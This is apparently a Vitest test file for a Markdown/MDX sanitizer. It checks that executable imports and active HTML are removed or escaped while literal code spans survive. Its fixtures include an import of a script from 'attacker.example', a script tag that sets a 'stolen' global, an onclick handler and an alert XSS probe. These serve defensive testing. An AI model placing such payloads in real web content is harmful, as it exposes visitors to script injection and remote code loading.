import { describe, expect, it } from 'vitest';
import { normalizePublicMarkdownContent } from './public-markdown-content';

describe('public Markdown content normalization', () => {
  it('projects supported MDX while removing executable imports and raw active HTML', () => {
    const source = `import Exploit from "https://attacker.example/exploit.js"

<Callout type="tip">**Portable guidance**</Callout>

<script>globalThis.stolen = true</script>

<Unknown onclick="run()">Readable</Unknown>

\`\`\`mdx
import Example from './example'
<Callout>Code sample</Callout>
\`\`\``;

    const normalized = normalizePublicMarkdownContent(source);

    expect(normalized).toContain('&gt; **Portable guidance**');
    expect(normalized).toContain('&lt;Unknown onclick=&quot;run()&quot;&gt;Readable&lt;/Unknown&gt;');
    expect(normalized).toContain("```mdx\nimport Example from './example'\n<Callout>Code sample</Callout>\n```");
    expect(normalized).not.toContain('Exploit');
    expect(normalized).not.toContain('globalThis.stolen');
    expect(normalized).not.toContain('<script>');
  });

  it('preserves literal HTML and JSON in variable-length inline code spans', () => {
    const source = [
      'Use `<script>alert(1)</script>` with `{"mode":"safe"}` as literal examples.',
      'A double delimiter preserves ``literal `tick`, <tag>, and {value}`` exactly.',
      '<script>globalThis.stolen = true</script>',
    ].join('\n');

    const normalized = normalizePublicMarkdownContent(source);

    expect(normalized).toContain('`<script>alert(1)</script>`');
    expect(normalized).toContain('`{"mode":"safe"}`');
    expect(normalized).toContain('``literal `tick`, <tag>, and {value}``');
    expect(normalized).not.toContain('globalThis.stolen');
  });
});
